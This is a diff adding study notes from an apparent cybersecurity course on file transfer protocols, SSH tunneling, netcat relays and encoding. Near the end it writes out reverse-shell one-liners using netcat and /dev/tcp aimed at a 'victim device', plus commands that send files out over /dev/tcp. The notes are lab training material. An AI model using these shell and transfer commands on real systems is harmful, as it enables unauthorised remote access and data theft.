@@ -544,6 +544,104 @@ NETWORK FORENSICS
 
 
 Section 4 (M,T,W): Data Transfer, Movement and Redirection
+- Common file transer methods: FTP (active & passive), TFTP, SCP, SFTP, FTPS
+- TFTP: Trivial File Transfer Protocol
+        - RFC 1350 rev2
+        - UDP, very small & simple communication
+        - No terminal communication, no directory services
+        - No authentication or encryption
+- FTP: File Transfer Protocol
+        - RFC 959
+        - 2 separate TCP connections: 21 (control), 20 (data)
+        - Authentication in clear-text, anonymous login - insecure in default config
+        - Has directory services
+        - Active: server reaches out to client (pizza delivery - you call, pizza is delivered)
+        - Passive: client reaches out to server (pizza pickup - you go in and take out)
+- FTP commands:
+        - FTP Active (anonymous): ftp 10.0.0.104 -> anonymous
+        - FTP Active (user): ftp 10.0.0.104 -> sonnyjim > (password)
+        - FTP Passive (wget): proxychains wget -r ftp://10.0.0.104 -> anonymous
+        - FTP Passive (anonymous): ftp 10.0.0.104 -> anonymous
+        - FTP Passive (user): proxychains ftp 10.0.0.104 -> sonnyjim -> (password)
+- FTPS: File Transfer Protocol Secure
+        - Adds SSL/TLS encryption
+        - Interactive terminal access
+        - Explicit mode: option for encryption, ports 20/21
+        - Implicit mode: encryption assumed, ports 989/990
+- SFTP: Secure File Transfer Protocol (SSH FTP)
+        - TCP 22
+        - Adds FTP-like services to SSH
+        - Symmetric & asymmetric encryption, authentication through username/pass or with SSH key
+        - Interactive terminal access
+- SCP: Secure Copy Protocol
+        - TCP 22
+        - Uses symmetric & asymmetric encryption
+        - Authentication through username & password or with SSH key
+        - Non-interactive
+        -v = verbose mode, -P = alternate port, -r = recursively copy entire directory, -3 = 3-way copy
+        - scp student@172.16.82.106:secretstuff.txt /home/student (download from remote to local)
+        - scp secretstuff.txt student@172.16.82.106:/home/student (upload from local to remote)
+        - scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student (copy from remote to remote)
+        - scp -r folder/ student@172.16.82.106: (upload folder to remote)
+        - scp -r student@172.16.82.106:folder/ . (download folder to local)
+- SCP with tunneling
+        - Local port forward
+                - ssh student@172.16.82.106 -L 1111:localhost:22 -NT (create local port foward to target device)
+                - scp -P 1111 student@localhost:secretstuff.txt /home/student (download from remote to local over tunnel)
+                - scp -P 1111 secretstuff.txt student@localhost:/home/student (upload from local to remote over tunnel)
+        - Remote port forward
+                - ssh student@172.16.82.106 -D 9050 -NT (create dynamic port forward)
+                - proxychains scp student@localhost:secretstuff.txt . (download from remote to local)
+                - proxychains scp secretstuff.txt student@localhost: (upload from local to remote)
+- Uncommon methods of file transfer:
+- Netcat: simply reads & writes data across sockets using TCP/IP protocol
+        - nc -lvp 9001 > newfile.txt (listener - receiving file)
+        - nc 172.16.82.106 9001 < file.txt (client - sending file)
+        - nc -lvp 9001 < file.txt (listener - sending file)
+        - nc 172.16.82.106 9001 > newfile.txt (client - receiving file)
+        - Listener to listener:
+                - mknod mypipe p
+                  nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe (on Blue_Host-1 Relay)
+                - nc 172.16.82.106 1111 < secret.txt (on Internet_Host - sending)
+                - nc 192.168.1.1 3333 > newsecret.txt (on Blue_Priv_Host-1 - receiving)
+        - Client to client:
+                - nc -lvp 1111 < secret.txt (on Internet_Host - sending)
+                - nc -lvp 3333 > newsecret.txt (on Blue_Priv_Host-1 - receiving)
+                - mknod mypipe p
+                  nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe (on Blue_Host-1 Relay)
+        - Client to listener:
+                - nc -lvp 1111 < secret.txt (on Internet_Host - sending)
+                - nc 192.168.1.1 3333 > newsecret.txt (on Blue_Priv_Host-1 - receiving)
+                - mknod mypipe p
+                  nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe (on Blue_Host-1 Relay)
+        - Listener to client:
+                - nc 172.16.82.106 1111 < secret.txt (on Internet_Host - sending)
+                - nc -lvp 3333 > newsecret.txt (on Blue_Priv_Host-1 - receiving)
+                - mknod mypipe p
+                  nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe (on Blue_Host-1 Relay)
+- File transfer with /dev/tcp: useful for a host that doesn't have netcat available
+        - On receiving box: nc -lvp 1111 > devtcpfile.txt
+        - On sending box: cat secret.txt > /dev/tcp/10.10.0.40/1111
+- Reverse shell with netcat
+        - On your device: nc -lvp 9999 (listen for the shell)
+        - On victim device: nc -c /bin/bash 10.10.0.40 9999
+        - On victim device: nc -e /bin/bash 10.10.0.40 9999
+- Reverse shell with /dev/tcp
+        - On your device: nc -lvp 9999 (listen for the shell)
+        - On victim device: /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
+PACKING/ENCODING
+- Packers: special code added to programs to compress executables
+        - Reduces network traffic, good for obfuscation, reduces time on target (example: UPX)
+- Encoding: Specialized formatting used for transmission & storage (Base64 & hex are most common)
+        - Hex encoding: used by IPv6 & MAC addresses, color schemes. Increases readability & information density
+                - XXD: converts to hex
+                - echo "Hex encoding test" | xxd -p (-p converts to a plain hex dump, -r -p restores that plain hex dump back to original text)
+                  (output) 48657820656e636f64696e6720746573740a
+        - Base64 encoding: binary-to-text encoding. A-Z, a-z, 1-9, +, /
+                - 6 bits per digit, 4 characters = 3 bytes = 1 group
+                - padding used to fill any unused space in each 24-bit group
+                - base64 -w0 logoCyber.png (-w0 to remove line wrapping. output file converted to base64, -d decodes from base64)
+
 
 
 
